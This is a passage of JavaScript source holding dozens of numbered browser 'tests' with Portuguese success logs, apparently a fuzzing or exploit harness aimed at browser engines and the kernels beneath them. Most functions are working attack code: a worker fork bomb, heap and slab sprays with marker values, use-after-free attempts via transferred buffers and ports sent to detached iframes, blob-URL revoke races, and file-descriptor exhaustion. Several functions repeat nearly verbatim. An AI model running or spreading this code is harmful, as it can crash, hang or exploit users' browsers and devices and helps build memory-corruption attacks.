                    try { history.pushState(temp[i], "k"+k+i, null); } catch(e){}
                }
                keep.push(...temp.filter((_,i)=>i%2===0));
                if(keep.length > 500) keep.splice(0, 200);
                if(k++ > 50) {
                    clearInterval(iv);
                    log("SUCESSO: Heap fragmentado via History API.");
                }
            }, 10);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest76() {
        log("Init Test 76: Iframe-Worker Port Detach...");
        const f = document.createElement('iframe');
        document.body.appendChild(f);
        const wCode = `self.onmessage=e=>{
            const p=e.data;
            setInterval(()=>{p.postMessage(new Uint8Array(1024).fill(1))},5);
        }`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const w = new Worker(u);
        const ch = new MessageChannel();
        try {
            f.contentWindow.postMessage("init", "*", [ch.port2]);
            w.postMessage(ch.port1, [ch.port1]);
            let steps = 0;
            const iv = setInterval(() => {
                if(steps === 10) document.body.removeChild(f);
                if(steps === 20) w.terminate();
                if(steps++ > 30) {
                    clearInterval(iv);
                    log("SUCESSO: Portas rfs entre worker e iframe morto.");
                }
            }, 20);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest77() {
        log("Init Test 77: Blob Fetch Flood & Revoke...");
        const b = new Blob([new Uint8Array(1024*1024*2).fill(0xCC)]);
        const u = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{
            const u=e.data;
            let n=0;
            const f=()=>{
                fetch(u).then(r=>r.blob()).then(()=>postMessage(++n)).catch(()=>{});
                if(n<1000) setTimeout(f,0);
            };
            f();
        }`;
        const wu = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<8; i++) {
                const w = new Worker(wu);
                w.postMessage(u);
                workers.push(w);
            }
            setTimeout(() => {
                URL.revokeObjectURL(u);
                log("URL revoked. Killing workers...");
                setTimeout(() => workers.forEach(w => w.terminate()), 50);
                log("SUCESSO: Race condition em VFS handles.");
            }, 200);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest78() {
        log("Init Test 78: Ring IPC Refcount Panic...");
        const ring = [];
        const size = 150;
        try {
            for(let i=0; i<size; i++) ring.push(new MessageChannel());
            for(let i=0; i<size; i++) {
                const next = (i+1) % size;
                ring[i].port1.postMessage("L", [ring[next].port1]);
            }
            let closed = 0;
            const iv = setInterval(() => {
                const idx = Math.floor(Math.random() * size);
                try { ring[idx].port2.postMessage("break"); ring[idx].port2.close(); } catch(e){}
                if(closed++ > 100) {
                    clearInterval(iv);
                    log("SUCESSO: Anel de referncia circular quebrado.");
                }
            }, 2);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest79() {
        log("Init Test 79: Worker Fork Bomb...");
        const code = `self.onmessage=e=>{
            if(e.data>0){
                try{
                    const w1=new Worker(self.location.href);
                    w1.postMessage(e.data-1);
                    const w2=new Worker(self.location.href);
                    w2.postMessage(e.data-1);
                }catch(x){}
            } else {
                while(true) Math.sin(0);
            }
        }`;
        const b = new Blob([code], {type:'text/javascript'});
        // Self reference workaround via object URL regeneration not needed if passing blob url string
        const u = URL.createObjectURL(b);
        // We pass the URL in message to avoid self.location issue if blob
        const bootCode = `self.onmessage=e=>{
            const u=e.data.u;
            const d=e.data.d;
            if(d>0){
                const w1=new Worker(u); w1.postMessage({u:u,d:d-1});
                const w2=new Worker(u); w2.postMessage({u:u,d:d-1});
            } else { setInterval(()=>{},100); }
        }`;
        const bootU = URL.createObjectURL(new Blob([bootCode],{type:'text/javascript'}));
        try {
            const root = new Worker(bootU);
            root.postMessage({u: bootU, d: 8}); // Depth 8 = 256 workers
            setTimeout(() => {
                root.terminate();
                log("SUCESSO: rvore de processos eliminada.");
            }, 1000);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest80() {
        log("Init Test 80: Full Queue Transfer Kill...");
        const ch = new MessageChannel();
        const payload = new Uint8Array(1024 * 32).fill(0xAA);
        const wCode = `self.onmessage=e=>{e.data.close();}`; // Immediately close received port
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        try {
            // Fill queue
            for(let i=0; i<3000; i++) ch.port1.postMessage(payload);
            const w = new Worker(u);
            w.postMessage(ch.port2, [ch.port2]);
            setTimeout(() => {
                w.terminate(); // Kill worker holding the filled port
                ch.port1.close();
                log("SUCESSO: Worker morto com fila IPC cheia pendente.");
            }, 100);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest81() {
        log("Init Test 81: Storage Event Thrashing...");
        const frames = [];
        try {
            for(let i=0; i<60; i++) {
                const f = document.createElement('iframe');
                document.body.appendChild(f);
                f.contentWindow.addEventListener('storage', ()=>{ 
                    const x = localStorage.length; 
                });
                frames.push(f);
            }
            let k = 0;
            const iv = setInterval(() => {
                localStorage.setItem("key"+k, Math.random());
                // Remove aleatrio
                if(k%2 === 0 && frames.length > 0) {
                    const idx = Math.floor(Math.random() * frames.length);
                    const rem = frames.splice(idx, 1)[0];
                    document.body.removeChild(rem);
                }
                if(k++ > 200) {
                    clearInterval(iv);
                    log("SUCESSO: Lista global de listeners corrompida.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest82() {
        log("Init Test 82: VFS Descriptor Exhaustion...");
        const b = new Blob([new Uint8Array(1024*1024*10).fill(0xBB)]);
        const readers = [];
        try {
            const limit = 4000;
            for(let i=0; i<limit; i++) {
                const fr = new FileReader();
                // Read slice to force new descriptor/handle
                fr.readAsArrayBuffer(b.slice(i*10, i*10+100));
                readers.push(fr);
                if(i % 500 === 0) {
                    // Pressure
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCESSO: " + limit + " leituras concorrentes disparadas.");
        } catch(e) { log("FALHA: " + e.message); }
    }
function runTest83() {
        log("Init Test 83: Recursive Buffer Race...");
        const code = `self.onmessage=e=>{
            const {buf, depth} = e.data;
            if(depth > 0) {
                try {
                    const w = new Worker(self.location.href);
                    w.postMessage({buf: buf, depth: depth-1}, [buf]);
                    setTimeout(() => w.terminate(), 5);
                } catch(x) {}
            }
        }`;
        const blob = new Blob([code], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        try {
            const buf = new ArrayBuffer(1024 * 1024 * 5); 
            const w = new Worker(url);
            w.postMessage({buf: buf, depth: 50}, [buf]);
            setTimeout(() => {
                w.terminate();
                log("SUCESSO: Buffer ping-pong interrompido.");
            }, 200);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest84() {
        log("Init Test 84: Port Entanglement...");
        const ch = new MessageChannel();
        let port = ch.port1;
        const ports = [];
        try {
            for(let i=0; i<1000; i++) {
                const next = new MessageChannel();
                port.postMessage("link", [next.port1]);
                port = next.port2;
                ports.push(port);
            }
            let k = 0;
            const iv = setInterval(() => {
                const idx = Math.floor(Math.random() * ports.length);
                try { ports[idx].close(); } catch(e){}
                if(k++ > 500) {
                    clearInterval(iv);
                    ch.port2.close();
                    log("SUCESSO: Entanglement destrudo aleatoriamente.");
                }
            }, 1);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest85() {
        log("Init Test 85: Heap Fragmentation...");
        const refs = [];
        try {
            let k = 0;
            const iv = setInterval(() => {
                for(let i=0; i<50; i++) {
                    const b = new ArrayBuffer(65536);
                    const v = new Uint32Array(b);
                    v[0] = 0xCAFEBABE;
                    if(i % 2 === 0) refs.push(b);
                    else {
                        try { history.pushState(b, "k"+k, null); } catch(x){}
                    }
                }
                if(refs.length > 2000) refs.splice(0, 1000);
                if(k++ > 100) {
                    clearInterval(iv);
                    log("SUCESSO: Heap pressure aplicado.");
                }
            }, 10);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest86() {
        log("Init Test 86: Detached Iframe Port...");
        const f = document.createElement('iframe');
        document.body.appendChild(f);
        const ch = new MessageChannel();
        try {
            f.contentWindow.postMessage("init", "*", [ch.port2]);
            const port = ch.port1;
            let count = 0;
            const iv = setInterval(() => {
                port.postMessage({buf: new Uint8Array(1024).fill(count)});
                if(count === 20) document.body.removeChild(f);
                if(count++ > 100) {
                    clearInterval(iv);
                    port.close();
                    log("SUCESSO: Mensagens para contexto detached.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest87() {
        log("Init Test 87: Blob Fetch/Revoke Race...");
        const b = new Blob([new Uint8Array(1024*1024*2).fill(0xAA)]);
        const u = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{
            const u=e.data;
            const t=Date.now();
            while(Date.now()-t<200){
                fetch(u).then(r=>r.blob()).catch(()=>{});
            }
        }`;
        const wu = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<10; i++) {
                const w = new Worker(wu);
                w.postMessage(u);
                workers.push(w);
            }
            setTimeout(() => {
                URL.revokeObjectURL(u);
                workers.forEach(w => w.terminate());
                log("SUCESSO: Race VFS executada.");
            }, 50);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest88() {
        log("Init Test 88: Circular IPC Refcount...");
        const chA = new MessageChannel();
        const chB = new MessageChannel();
        const chC = new MessageChannel();
        try {
            chA.port1.postMessage("L", [chB.port1]);
            chB.port2.postMessage("L", [chC.port1]);
            chC.port2.postMessage("L", [chA.port2]);
            const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{e.data.close()}"],{type:'text/javascript'})));
            w.postMessage(chA.port2, [chA.port2]);
            setTimeout(() => {
                w.terminate();
                chB.port2.close();
                chC.port2.close();
                log("SUCESSO: Ciclo de portas rfo criado.");
            }, 100);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest89() {
        log("Init Test 89: Broadcast Herd Kill...");
        const name = "herd_" + Date.now();
        const code = `const bc=new BroadcastChannel('${name}');bc.onmessage=()=>{postMessage('ack');while(1);}`;
        const u = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<60; i++) workers.push(new Worker(u));
            const bc = new BroadcastChannel(name);
            setTimeout(() => {
                bc.postMessage("wake");
                setTimeout(() => {
                    workers.forEach(w => w.terminate());
                    bc.close();
                    log("SUCESSO: Wakeup storm interrompida.");
                }, 10);
            }, 500);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest90() {
        log("Init Test 90: IPC Pipe Overflow...");
        const ch = new MessageChannel();
        const payload = new Uint8Array(1024 * 32).fill(0xCC);
        try {
            let sent = 0;
            const iv = setInterval(() => {
                for(let k=0; k<50; k++) {
                    ch.port1.postMessage(payload);
                    sent++;
                }
                if(sent > 4000) {
                    clearInterval(iv);
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.postMessage(ch.port2, [ch.port2]);
                    setTimeout(() => {
                        w.terminate();
                        ch.port1.close();
                        log("SUCESSO: Pipe saturado transferido para thread morta.");
                    }, 50);
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest91() {
        log("Init Test 91: Global Storage List Corruption...");
        const frames = [];
        try {
            for(let i=0; i<50; i++) {
                const f = document.createElement('iframe');
                document.body.appendChild(f);
                f.contentWindow.onstorage = () => { const x = new Uint8Array(100); };
                frames.push(f);
            }
            let k = 0;
            const iv = setInterval(() => {
                localStorage.setItem("k"+k, Math.random());
                if(k % 4 === 0 && frames.length > 0) {
                    const idx = Math.floor(Math.random() * frames.length);
                    const r = frames.splice(idx, 1)[0];
                    document.body.removeChild(r);
                }
                if(k++ > 200) {
                    clearInterval(iv);
                    log("SUCESSO: Lista global corrompida.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest92() {
        log("Init Test 92: FD Exhaustion...");
        const b = new Blob([new Uint8Array(1024*1024*5).fill(0x00)]);
        const readers = [];
        try {
            const limit = 3000;
            for(let i=0; i<limit; i++) {
                const fr = new FileReader();
                fr.readAsArrayBuffer(b.slice(i*100, i*100+50));
                readers.push(fr);
                if(i % 300 === 0) {
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCESSO: " + limit + " Handles abertos com thread churn.");
        } catch(e) { log("FALHA: " + e.message); }
    }
function runTest93() {
        log("Init Test 93: Worker Buffer UAF...");
        const code = `self.onmessage=e=>{
            const {d,b}=e.data;
            if(d>0){
                try{
                    const w=new Worker(self.location.href);
                    const n=new Uint8Array(b.byteLength);
                    w.postMessage({d:d-1,b:n.buffer},[n.buffer]);
                    setTimeout(()=>w.terminate(),Math.random()*10);
                }catch(x){}
            }else{
                const v=new Uint32Array(1024*100);
                self.postMessage(v.length);
            }
        }`;
        const b = new Blob([code],{type:'text/javascript'});
        const u = URL.createObjectURL(b);
        try {
            const buf = new ArrayBuffer(1024*1024*2);
            const w = new Worker(u);
            w.postMessage({d:20,b:buf},[buf]);
            const i = setInterval(()=>{
                const s=new Uint8Array(1024*1024*5);
                s.fill(0x41);
            },10);
            setTimeout(()=>{
                clearInterval(i);
                w.terminate();
                log("SUCESSO: Ciclo recursivo de UAF em buffers.");
            },1000);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest94() {
        log("Init Test 94: Entanglement Storm...");
        const ch = new MessageChannel();
        let curr = ch.port1;
        const ports = [];
        try {
            for(let i=0; i<1500; i++) {
                const next = new MessageChannel();
                curr.postMessage({i:i},[next.port1]);
                curr = next.port2;
                ports.push(curr);
            }
            let k = 0;
            const iv = setInterval(()=>{
                const idx = Math.floor(Math.random()*ports.length);
                if(ports[idx]) {
                    try{ports[idx].postMessage("ping");ports[idx].close();}catch(x){}
                    ports[idx] = null;
                }
                if(k++ > 600) {
                    clearInterval(iv);
                    ch.port2.close();
                    log("SUCESSO: Tempestade de IPC finalizada.");
                }
            },1);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest95() {
        log("Init Test 95: Slab Allocator Spray...");
        const junk = [];
        try {
            let k = 0;
            const iv = setInterval(()=>{
                for(let i=0; i<50; i++) {
                    const b = new ArrayBuffer(32768); 
                    const v = new Uint32Array(b);
                    v[0] = 0xCAFEBABE;
                    v[8191] = 0xDEADBEEF;
                    if(i%3===0) junk.push(b);
                    else {
                        try{history.pushState(b,"k"+k+i,null);}catch(x){}
                    }
                }
                if(junk.length > 5000) junk.splice(0,2000);
                if(k++ > 150) {
                    clearInterval(iv);
                    log("SUCESSO: Presso no alocador de slabs.");
                }
            },5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest96() {
        log("Init Test 96: Zombie Iframe Port...");
        const f = document.createElement('iframe');
        document.body.appendChild(f);
        const wCode = `self.onmessage=e=>{
            const p=e.data;
            setInterval(()=>{try{p.postMessage(new ArrayBuffer(1024))}catch(x){}},1);
        }`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const w = new Worker(u);
        const ch = new MessageChannel();
        try {
            f.contentWindow.postMessage("init","*",[ch.port2]);
            w.postMessage(ch.port1,[ch.port1]);
            setTimeout(()=>{
                document.body.removeChild(f);
                setTimeout(()=>w.terminate(),100);
                log("SUCESSO: Transferncia para contexto morto.");
            },200);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest97() {
        log("Init Test 97: VFS Revoke Race...");
        const b = new Blob([new Uint8Array(1024*1024*4).fill(0xCC)]);
        const u = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{
            const u=e.data;
            const t=Date.now();
            while(Date.now()-t<500){
                fetch(u).then(r=>r.arrayBuffer()).catch(x=>{});
            }
        }`;
        const uW = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const ws = [];
        try {
            for(let i=0; i<12; i++) {
                const w = new Worker(uW);
                w.postMessage(u);
                ws.push(w);
            }
            setTimeout(()=>{
                URL.revokeObjectURL(u);
                ws.forEach(w=>w.terminate());
                log("SUCESSO: VFS Handles race condition.");
            },100);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest98() {
        log("Init Test 98: Circular IPC Panic...");
        const ring = [];
        const size = 200;
        try {
            for(let i=0; i<size; i++) ring.push(new MessageChannel());
            for(let i=0; i<size; i++) {
                const next = (i+1)%size;
                ring[i].port1.postMessage("L",[ring[next].port1]);
            }
            const wCode = `onmessage=e=>{e.data.close()}`;
            const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
            const w = new Worker(u);
            w.postMessage(ring[0].port2,[ring[0].port2]);
            setTimeout(()=>{
                w.terminate();
                for(let i=1; i<size; i++) try{ring[i].port2.close()}catch(x){}
                log("SUCESSO: Anel de refcount rfo no kernel.");
            },200);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest99() {
        log("Init Test 99: Broadcast Storm Kill...");
        const name = "storm_"+Date.now();
        const code = `const bc=new BroadcastChannel('${name}');bc.onmessage=()=>{postMessage('a');while(1);}`;
        const u = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        const ws = [];
        try {
            for(let i=0; i<60; i++) ws.push(new Worker(u));
            const bc = new BroadcastChannel(name);
            bc.postMessage("wake");
            setTimeout(()=>{
                ws.forEach(w=>w.terminate());
                bc.close();
                log("SUCESSO: Scheduler mass kill.");
            },150);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest100() {
        log("Init Test 100: Pipe Zombie Transfer...");
        const ch = new MessageChannel();
        const load = new Uint8Array(1024*64).fill(0xAA);
        const wCode = `onmessage=e=>{e.data.close()}`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        try {
            let s=0;
            const iv = setInterval(()=>{
                for(let k=0; k<20; k++){
                    ch.port1.postMessage(load);
                    s++;
                }
                if(s>3000){
                    clearInterval(iv);
                    const w = new Worker(u);
                    w.postMessage(ch.port2,[ch.port2]);
                    setTimeout(()=>{
                        w.terminate();
                        ch.port1.close();
                        log("SUCESSO: Pipe cheio em processo morto.");
                    },50);
                }
            },5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest101() {
        log("Init Test 101: Storage Listener Race...");
        const f = [];
        try {
            for(let i=0; i<80; i++){
                const fr = document.createElement('iframe');
                document.body.appendChild(fr);
                fr.contentWindow.addEventListener('storage',()=>{const z=new Uint8Array(100);});
                f.push(fr);
            }
            let k=0;
            const iv = setInterval(()=>{
                localStorage.setItem("x"+k,Math.random());
                if(k%3===0 && f.length>0){
                    const r = f.splice(Math.floor(Math.random()*f.length),1)[0];
                    document.body.removeChild(r);
                }
                if(k++>300){
                    clearInterval(iv);
                    log("SUCESSO: Lista global de eventos instvel.");
                }
            },2);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest102() {
        log("Init Test 102: FD Table Contention...");
        const b = new Blob([new Uint8Array(1024*1024*8).fill(0x00)]);
        const rs = [];
        try {
            const l = 5000;
            for(let i=0; i<l; i++){
                const fr = new FileReader();
                fr.readAsArrayBuffer(b.slice(i*100, i*100+10));
                rs.push(fr);
                if(i%250===0){
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCESSO: Exausto de descritores e lock de tabela.");
        } catch(e) { log("FALHA: " + e.message); }
    }
 function runTest103() {
        log("Init Test 103: Worker Recursive UAF...");
        const code = `self.onmessage=e=>{
            const {d,b}=e.data;
            if(d>0){
                try{
                    const w=new Worker(self.location.href);
                    const n=new Uint8Array(b.byteLength);
                    w.postMessage({d:d-1,b:n.buffer},[n.buffer]);
                    const i=setInterval(()=>{
                        try{w.postMessage({d:0,b:new ArrayBuffer(10)})}catch(x){}
                    },1);
                    setTimeout(()=>{clearInterval(i);w.terminate()},Math.random()*20);
                }catch(x){}
            }
        }`;
        const b = new Blob([code],{type:'text/javascript'});
        const u = URL.createObjectURL(b);
        try {
            const buf = new ArrayBuffer(1024*1024*4);
            const w = new Worker(u);
            w.postMessage({d:25,b:buf},[buf]);
            const iv = setInterval(()=>{
                const s=new Uint8Array(1024*1024);
                s.fill(0xCC);
            },15);
            setTimeout(()=>{
                clearInterval(iv);
                w.terminate();
                log("SUCESSO: Cadeia recursiva de workers colapsada.");
            },1500);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest104() {
        log("Init Test 104: Port Chain Pruning...");
        const ch = new MessageChannel();
        let curr = ch.port1;
        const chain = [];
        try {
            for(let i=0; i<2000; i++) {
                const next = new MessageChannel();
                curr.postMessage({idx:i},[next.port1]);
                chain.push(curr);
                curr = next.port2;
            }
            let k = 0;
            const iv = setInterval(()=>{
                for(let j=0; j<5; j++){
                    const idx = Math.floor(Math.random()*chain.length);
                    if(chain[idx]) {
                        try{chain[idx].close();}catch(x){}
                        chain[idx]=null;
                    }
                }
                if(k++ > 400) {
                    clearInterval(iv);
                    ch.port2.close();
                    log("SUCESSO: Cadeia IPC destruda aleatoriamente.");
                }
            },2);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest105() {
        log("Init Test 105: History Slab Stress...");
        const keeper = [];
        try {
            let k = 0;
            const iv = setInterval(()=>{
                for(let i=0; i<100; i++) {
                    const b = new ArrayBuffer(16384);
                    const v = new Uint32Array(b);
                    v[0] = 0xAA55AA55;
                    v[4095] = 0x55AA55AA;
                    if(i%4===0) keeper.push(b);
                    else {
                        try{history.pushState(b,"state"+k+i,null);}catch(x){}
                    }
                }
                if(keeper.length > 3000) keeper.splice(0,1500);
                if(k++ > 100) {
                    clearInterval(iv);
                    log("SUCESSO: Fragmentao do heap via History.");
                }
            },10);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest106() {
        log("Init Test 106: Detached Iframe Transfer...");
        const f = document.createElement('iframe');
        document.body.appendChild(f);
        const wCode = `self.onmessage=e=>{
            const p=e.data;
            let c=0;
            const i=setInterval(()=>{
                try{p.postMessage(new Uint8Array(2048).fill(c++))}catch(x){}
                if(c>200) clearInterval(i);
            },2);
        }`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const w = new Worker(u);
        const ch = new MessageChannel();
        try {
            f.contentWindow.postMessage("init","*",[ch.port2]);
            w.postMessage(ch.port1,[ch.port1]);
            setTimeout(()=>{
                document.body.removeChild(f);
                setTimeout(()=>w.terminate(),150);
                log("SUCESSO: Transferncia para contexto iframe morto.");
            },100);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest107() {
        log("Init Test 107: Blob Fetch/Revoke Race...");
        const b = new Blob([new Uint8Array(1024*1024*3).fill(0xEE)]);
        const u = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{
            const u=e.data;
            let c=0;
            const run=()=>{
                fetch(u).then(r=>r.blob()).then(()=>postMessage(++c)).catch(()=>{});
                if(c<500) setTimeout(run,0);
            };
            run();
        }`;
        const uW = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<12; i++) {
                const w = new Worker(uW);
                w.postMessage(u);
                workers.push(w);
            }
            setTimeout(()=>{
                URL.revokeObjectURL(u);
                workers.forEach(w=>w.terminate());
                log("SUCESSO: Race condition em VFS handles disparada.");
            },80);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest108() {
        log("Init Test 108: Ring Refcount Panic...");
        const ring = [];
        const size = 250;
        try {
            for(let i=0; i<size; i++) ring.push(new MessageChannel());
            for(let i=0; i<size; i++) {
                const next = (i+1)%size;
                ring[i].port1.postMessage("Ref",[ring[next].port1]);
            }
            const killer = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{e.data.close()}"],{type:'text/javascript'})));
            killer.postMessage(ring[0].port2,[ring[0].port2]);
            setTimeout(()=>{
                killer.terminate();
                for(let i=1;i<size;i++) try{ring[i].port2.close()}catch(x){}
                log("SUCESSO: Ciclo de refcount isolado no kernel.");
            },200);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest109() {
        log("Init Test 109: Broadcast Herd Kill...");
        const name = "herd_"+Date.now();
        const code = `const bc=new BroadcastChannel('${name}');bc.onmessage=()=>{while(1);}`;
        const u = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<80; i++) workers.push(new Worker(u));
            const bc = new BroadcastChannel(name);
            bc.postMessage("wake");
            setTimeout(()=>{
                workers.forEach(w=>w.terminate());
                bc.close();
                log("SUCESSO: Thundering herd eliminada.");
            },100);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest110() {
        log("Init Test 110: Pipe Zombie Transfer...");
        const ch = new MessageChannel();
        const load = new Uint8Array(1024*48).fill(0xFF);
        const wCode = `onmessage=e=>{e.data.close()}`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        try {
            let s = 0;
            const iv = setInterval(()=>{
                for(let k=0; k<40; k++){
                    ch.port1.postMessage(load);
                    s++;
                }
                if(s > 5000) {
                    clearInterval(iv);
                    const w = new Worker(u);
                    w.postMessage(ch.port2, [ch.port2]);
                    setTimeout(()=>{
                        w.terminate();
                        ch.port1.close();
                        log("SUCESSO: Pipe cheio transferido para processo morto.");
                    },50);
                }
            },5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest111() {
        log("Init Test 111: Storage List Corruption...");
        const frames = [];
        try {
            for(let i=0; i<100; i++) {
                const f = document.createElement('iframe');
                document.body.appendChild(f);
                f.contentWindow.addEventListener('storage',()=>{const x=new Uint8Array(200);});
                frames.push(f);
            }
            let k = 0;
            const iv = setInterval(()=>{
                localStorage.setItem("key"+k, Math.random());
                if(k%2===0 && frames.length>0) {
                    const idx = Math.floor(Math.random()*frames.length);
                    const r = frames.splice(idx,1)[0];
                    document.body.removeChild(r);
                }
                if(k++ > 400) {
                    clearInterval(iv);
                    log("SUCESSO: Lista global de listeners instvel.");
                }
            },2);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest112() {
        log("Init Test 112: FD Table Contention...");
        const b = new Blob([new Uint8Array(1024*1024*10).fill(0x00)]);
        const readers = [];
        try {
            const limit = 6000;
            for(let i=0; i<limit; i++) {
                const fr = new FileReader();
                fr.readAsArrayBuffer(b.slice(i*50, i*50+10));
                readers.push(fr);
                if(i%400 === 0) {
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCESSO: Exausto massiva de File Descriptors.");
        } catch(e) { log("FALHA: " + e.message); }
    }
 function runTest113() {
        log("Init Test 113: Worker Recursive Buffer UAF...");
        const code = `self.onmessage=e=>{
            const {d,b}=e.data;
            if(d>0){
                try{
                    const w=new Worker(self.location.href);
                    const n=new Uint8Array(b.byteLength);
                    w.postMessage({d:d-1,b:n.buffer},[n.buffer]);
                    const trash=[];
                    for(let i=0;i<100;i++) trash.push({a:i,b:new Uint8Array(1024)});
                    setTimeout(()=>w.terminate(),Math.random()*10);
                }catch(x){}
            }else{
                const v=new Uint32Array(1024*100);
                self.postMessage(v.length);
            }
        }`;
        const b = new Blob([code],{type:'text/javascript'});
        const u = URL.createObjectURL(b);
        try {
            const buf = new ArrayBuffer(1024*1024*2);
            const w = new Worker(u);
            w.postMessage({d:30,b:buf},[buf]);
            const i = setInterval(()=>{
                const s=new Uint8Array(1024*1024*2);
                s.fill(0x41);
            },10);
            setTimeout(()=>{
                clearInterval(i);
                w.terminate();
                log("SUCESSO: Ciclo recursivo de UAF em buffers com GC.");
            },1200);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest114() {
        log("Init Test 114: Entanglement Storm Pruning...");
        const ch = new MessageChannel();
        let curr = ch.port1;
        const ports = [];
        try {
            for(let i=0; i<1800; i++) {
                const next = new MessageChannel();
                curr.postMessage({i:i},[next.port1]);
                curr = next.port2;
                ports.push(curr);
            }
            let k = 0;
            const iv = setInterval(()=>{
                for(let j=0; j<5; j++) {
                    const idx = Math.floor(Math.random()*ports.length);
                    if(ports[idx]) {
                        try{ports[idx].postMessage("ping");ports[idx].close();}catch(x){}
                        ports[idx] = null;
                    }
                }
                if(k++ > 500) {
                    clearInterval(iv);
                    ch.port2.close();
                    log("SUCESSO: Tempestade de IPC finalizada.");
                }
            },1);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest115() {
        log("Init Test 115: Slab Allocator Spray...");
        const junk = [];
        try {
            let k = 0;
            const iv = setInterval(()=>{
                for(let i=0; i<60; i++) {
                    const b = new ArrayBuffer(32768); 
                    const v = new Uint32Array(b);
                    v[0] = 0xCAFEBABE;
                    v[8191] = 0xDEADBEEF;
                    if(i%3===0) junk.push(b);
                    else {
                        try{history.pushState(b,"k"+k+i,null);}catch(x){}
                    }
                }
                if(junk.length > 4000) junk.splice(0,2000);
                if(k++ > 120) {
                    clearInterval(iv);
                    log("SUCESSO: Presso no alocador de slabs.");
                }
            },5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest116() {
        log("Init Test 116: Zombie Iframe Port Transfer...");
        const f = document.createElement('iframe');
        document.body.appendChild(f);
        const wCode = `self.onmessage=e=>{
            const p=e.data;
            let c=0;
            setInterval(()=>{try{p.postMessage(new ArrayBuffer(1024));c++}catch(x){}},1);
        }`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const w = new Worker(u);
        const ch = new MessageChannel();
        try {
            f.contentWindow.postMessage("init","*",[ch.port2]);
            w.postMessage(ch.port1,[ch.port1]);
            setTimeout(()=>{
                document.body.removeChild(f);
                setTimeout(()=>w.terminate(),150);
                log("SUCESSO: Transferncia para contexto morto.");
            },100);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest117() {
        log("Init Test 117: VFS Revoke Race...");
        const b = new Blob([new Uint8Array(1024*1024*4).fill(0xCC)]);
        const u = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{
            const u=e.data;
            const t=Date.now();
            while(Date.now()-t<600){
                fetch(u).then(r=>r.arrayBuffer()).catch(x=>{});
            }
        }`;
